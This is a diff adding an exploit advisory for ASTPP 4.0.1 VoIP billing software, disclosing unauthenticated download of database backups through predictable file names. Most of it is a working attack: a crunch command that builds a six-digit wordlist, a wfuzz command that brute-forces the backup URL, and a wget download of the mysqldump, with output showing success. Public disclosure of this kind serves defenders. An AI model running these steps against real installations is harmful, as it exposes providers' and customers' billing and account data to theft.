@@ -1,0 +1,56 @@
+# Exploit Title: ASTPP 4.0.1 VoIP Billing - Database Backup Download
+# Date: 2019-11-18
+# Exploit Author: Fabien AUNAY
+# Vendor Homepage: https://www.astppbilling.org/
+# Software Link: https://github.com/iNextrix/ASTPP/tree/v4.0.1
+# Version: 4.0.1 vendor default setup script
+# Tested on: Debian 9 - CentOS 7
+# CVE : -
+
+###########################################################################################################
+ASTPP 4.0.1 VoIP Billing Unauthenticated Predictable database backup download
+
+A Smart TelePhony Platform for Individual Business, Wholesale and Residential VoIP Service Providers!
+It is available as an open source solution. It means without any investment, one can start his telephony
+business using ASTPP.
+ASTPP, being one of the most powerful VoIP Billing Software, thrives to benefit its users by providing a
+comprehensive telephony solution. This open source solution has lifted itself up from a mere VoIP billing
+solution to “A Smart TelePhony Platform”.
+The latest version of ASTPP is provisioned with some advanced functional modules which are designed
+to eliminate the need of multiple solutions to run a VoIP business. It has integrated hosted IP PBX, Class
+4/5 Softswitch, and complete invoicing and billing solution developed by leveraging Smart
+Technology.
+
+When administrator performs a ASTPP backup in web interface (Configuration / Database Restore / Create)
+the file name follows a semi-predictable pattern located in /var/www/html/astpp/database_backup/.
+
+The file name can be FUZZED for data exfiltration with the following pattern: astpp_20200110080136.sql.gz
+
+Pattern review:
+- astpp_
+- year
+- month
+- day
+- 6 PIN digit
+
+Steps:
+Objective 1 : Generate your 6 PIN list
+Objective 2 : FUZZ the target URL
+Objective 3 : Download the mysqldump
+
+###########################################################################################################
+
+Objective 1: Generate your 6 PIN list
+POC: crunch 6 6 0123456789 > pin_fuzzer.list
+
+Objective 2 : FUZZ the target URL
+POC: wfuzz --hc 302 -w pin_fuzzer.list 'http://127.0.0.1/database_backup/astpp_20200110FUZZ.sql.gz'
+===================================================================
+ID           Response   Lines    Word     Chars       Payload
+===================================================================
+
+000080137:   200        1135 L   6859 W   550239 Ch   "080136"
+
+Objective 3 : Download the mysqldump
+POC: wget http://127.0.0.1/database_backup/astpp_20200110080136.sql.gz
+astpp_20200110080136.sql.gz             100%[===============================================================================>] 296,70K  1,05MB/s    ds 0,3
